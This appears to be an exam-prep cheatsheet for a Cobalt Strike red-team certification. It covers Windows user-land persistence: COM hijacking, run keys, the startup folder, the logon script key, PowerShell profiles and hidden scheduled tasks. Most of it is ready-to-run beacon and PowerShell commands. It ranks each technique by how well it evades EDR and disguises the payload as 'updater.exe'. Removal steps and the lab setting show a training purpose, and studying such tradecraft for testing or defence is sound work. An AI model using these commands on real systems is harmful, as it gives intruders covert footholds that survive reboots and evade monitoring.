# C07 - Persistence (User-Land)

> User-land only — no admin required. Elevated persistence techniques are in `cheatsheets/elevated-persistence.md`.
> **Exam critical:** Set persistence before taking a break. Save Progress does not preserve running Beacons or P2P chains.

---

## OPSEC Ranking

| Technique | OPSEC | Trigger | Admin needed |
|-----------|-------|---------|-------------|
| COM Hijacking (HKCU) | SAFE | Application load | No |
| Logon Script (HKCU env key) | CAUTION | User logon | No |
| PowerShell Profile | CAUTION | Any PS window opened | No |
| Scheduled Task | CAUTION | Logon / time / event | No |
| Registry Run Key | UNSAFE | User logon | No |
| Startup Folder | UNSAFE | User logon | No |

> **Exam preference order: COM Hijack → Logon Script → Scheduled Task → Registry Run Key**

---

## 1. COM Hijacking (HKCU) — OPSEC-SAFE

Best exam-day persistence. HKCU write only (no admin), no new scheduled task or run key event.

**Find hijack opportunities with ProcMon:**
```
Operation = RegOpenKey
Path contains CLSID
Result = NAME NOT FOUND
```
Export CSV → frequency analysis → find a CLSID loaded a modest number of times (not thousands/minute).

**Check if CLSID exists only in HKLM (not HKCU) — hijackable:**
```powershell
# In HKLM (exists):
Get-Item "HKLM:\Software\Classes\CLSID\{<CLSID>}"

# Not in HKCU (hijackable):
Get-Item "HKCU:\Software\Classes\CLSID\{<CLSID>}"
# Error = does not exist = hijackable
```

**Create the hijack:**
```powershell
# Point HKCU CLSID → your DLL payload (in a writable, allowed path)
$clsid = '{<CLSID from procmon>}'
$dll   = 'C:\Users\pchilds\AppData\Local\payload.dll'

New-Item    -Path "HKCU:\Software\Classes\CLSID\$clsid\InprocServer32" -Value $dll -Force
New-ItemProperty -Path "HKCU:\Software\Classes\CLSID\$clsid\InprocServer32" `
                 -Name 'ThreadingModel' -Value 'Both' -Force
```

**Trigger:** Log out and back in — the application that loads this COM object (e.g. `DllHost.exe`) will load your DLL and callback with a new Beacon.

**CS Beacon commands:**
```cs
// Upload DLL payload to target first
beacon> upload C:\Payloads\http_x64.dll
beacon> mv http_x64.dll C:\Users\pchilds\AppData\Local\payload.dll

// Set registry (reg_set syntax: host:optional  hive  key  value  type  data)
beacon> reg_set HKCU Software\Classes\CLSID\{<CLSID>}\InprocServer32 "" REG_SZ C:\Users\pchilds\AppData\Local\payload.dll
beacon> reg_set HKCU Software\Classes\CLSID\{<CLSID>}\InprocServer32 ThreadingModel REG_SZ Both
```

**Remove when done:**
```cs
beacon> reg_delete HKCU Software\Classes\CLSID\{<CLSID>}
```

---

## 2. Registry Run Keys — OPSEC-CAUTION

Persistent across every reboot. Runs on every user logon. Well-known detection point — EDR and Defender monitor run keys.

**Key locations (user-land, no admin):**
```
HKCU\Software\Microsoft\Windows\CurrentVersion\Run       ← persistent (every logon)
HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce  ← deleted after first run
```

**Drop payload to a low-profile path first:**
```cs
beacon> cd C:\Users\pchilds\AppData\Local\Microsoft\WindowsApps
beacon> upload C:\Payloads\http_x64.exe
beacon> mv http_x64.exe updater.exe
```

**Set run key:**
```cs
// reg_set syntax: hive  key  value  type  data
beacon> reg_set HKCU Software\Microsoft\Windows\CurrentVersion\Run Updater REG_SZ C:\Users\pchilds\AppData\Local\Microsoft\WindowsApps\updater.exe

// Verify
beacon> reg_query HKCU Software\Microsoft\Windows\CurrentVersion\Run
```

**Remove:**
```cs
beacon> reg_delete HKCU Software\Microsoft\Windows\CurrentVersion\Run Updater
```

---

## 3. Startup Folder — OPSEC-CAUTION

Executables in the startup folder run on user logon. Simple but highly visible.

**Path:**
```
C:\Users\<user>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\
```

```cs
beacon> upload C:\Payloads\http_x64.exe
beacon> mv http_x64.exe "C:\Users\pchilds\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\updater.exe"
```

**Remove:**
```cs
beacon> rm "C:\Users\pchilds\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\updater.exe"
```

---

## 4. Logon Script (HKCU Environment Key)

`UserInitMprLogonScript` value in the Environment registry key executes a program on user logon.

```cs
beacon> reg_set HKCU Environment UserInitMprLogonScript REG_SZ C:\Users\pchilds\AppData\Local\Microsoft\WindowsApps\updater.exe
```

**Remove:**
```cs
beacon> reg_delete HKCU Environment UserInitMprLogonScript
```

---

## 5. PowerShell Profile

`$PROFILE` script executes when any new PowerShell window is opened by the user.

**Profile path (Windows PowerShell):**
```
C:\Users\<user>\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1
```

**Profile content — use Start-Job to avoid blocking the PS prompt:**
```powershell
Start-Job -ScriptBlock {
    Start-Sleep -Seconds 5
    & "C:\Users\pchilds\AppData\Local\Microsoft\WindowsApps\updater.exe"
}
```

```cs
// Upload profile (creates dir if needed)
beacon> mkdir C:\Users\pchilds\Documents\WindowsPowerShell
beacon> upload C:\Payloads\Microsoft.PowerShell_profile.ps1
beacon> mv Microsoft.PowerShell_profile.ps1 C:\Users\pchilds\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1
```

> **Do not put blocking code in the profile** — the user will not get a PS prompt until the script completes.

**Remove:**
```cs
beacon> rm C:\Users\pchilds\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1
```

---

## 6. Scheduled Task — OPSEC-CAUTION

Task Scheduler supports triggers: logon, startup, idle, time, system event.

**Task XML template (logon trigger):**
```xml
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
    </LogonTrigger>
  </Triggers>
  <Actions Context="Author">
    <Exec>
      <Command>C:\Users\pchilds\AppData\Local\Microsoft\WindowsApps\updater.exe</Command>
    </Exec>
  </Actions>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Hidden>true</Hidden>
  </Settings>
</Task>
```

```cs
// Upload XML to target, then create task
beacon> upload C:\Payloads\task.xml
beacon> shell schtasks /create /tn \Beacon /xml task.xml     // OPSEC-UNSAFE — spawns cmd.exe
beacon> run schtasks /create /tn \Beacon /xml task.xml       // OPSEC-CAUTION — no cmd.exe, still spawns proc
// Task name must start with \
```

**OPSEC-SAFE alternative — COM object via powerpick (no schtasks.exe, no child process):**
```cs
beacon> powerpick $action = New-ScheduledTaskAction -Execute 'C:\Users\pchilds\AppData\Local\Microsoft\WindowsApps\updater.exe'; Register-ScheduledTask -TaskName 'Updater' -Action $action -RunLevel Highest
```

**OPSEC-SAFE enumeration alternatives:**
```cs
// Seatbelt via execute-assembly (in-memory, no child process)
beacon> execute-assembly Seatbelt.exe ScheduledTasks

// powerpick (no powershell.exe spawned)
beacon> powerpick Get-ScheduledTask | Select TaskName,TaskPath,State | Format-List
```

> **Event IDs generated on task creation:** `4698` (Task Scheduler created a task) — logged on the local host.
> `schtasks.exe` spawned as a child of beacon is high-confidence EDR telemetry. Prefer `powerpick`/`execute-assembly` path in exam.

**Remove:**
```cs
beacon> shell schtasks /delete /tn \Beacon /f               // OPSEC-UNSAFE
beacon> run schtasks /delete /tn \Beacon /f                 // OPSEC-CAUTION
// OPSEC-SAFE remove:
beacon> powerpick Unregister-ScheduledTask -TaskName 'Updater' -Confirm:$false
```

---

## Exam Day — Persistence Workflow

```
1. After first Beacon checks in — immediately set persistence before anything else
2. Choose COM Hijacking first:
   a. Run procmon on a lab clone → find low-frequency CLSID missing from HKCU
   b. Upload DLL payload → set HKCU CLSID registry entries
   c. Verify: log out/in → second Beacon checks in
3. If COM hijack unavailable → fallback to Scheduled Task (logon trigger)
4. Before ANY break → confirm persistence beacon is still checking in
5. Document the CLSID / key used → reg_delete it when persistence is no longer needed
```

---

## Quick Reference

```
COM HIJACK:    reg_set HKCU Software\Classes\CLSID\{GUID}\InprocServer32 "" REG_SZ <dll_path>
               reg_set HKCU Software\Classes\CLSID\{GUID}\InprocServer32 ThreadingModel REG_SZ Both

RUN KEY:       reg_set HKCU Software\Microsoft\Windows\CurrentVersion\Run <name> REG_SZ <exe_path>

STARTUP:       upload payload → mv to C:\Users\<user>\AppData\Roaming\...\Startup\

LOGON SCRIPT:  reg_set HKCU Environment UserInitMprLogonScript REG_SZ <exe_path>

PS PROFILE:    upload profile.ps1 → mv to Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1

SCHED TASK:    upload task.xml → shell schtasks /create /tn \Beacon /xml task.xml  [UNSAFE]
               run schtasks /create /tn \Beacon /xml task.xml                        [CAUTION]
               powerpick Register-ScheduledTask ...                                  [SAFE]

ENUM TASK:     execute-assembly Seatbelt.exe ScheduledTasks                         [SAFE]
               powerpick Get-ScheduledTask | Select TaskName,TaskPath,State          [SAFE]

REMOVE COM:    reg_delete HKCU Software\Classes\CLSID\{GUID}
REMOVE RUN:    reg_delete HKCU Software\Microsoft\Windows\CurrentVersion\Run <name>
REMOVE TASK:   shell schtasks /delete /tn \Beacon /f  [UNSAFE] | powerpick Unregister-ScheduledTask -TaskName 'Updater' -Confirm:$false  [SAFE]
```
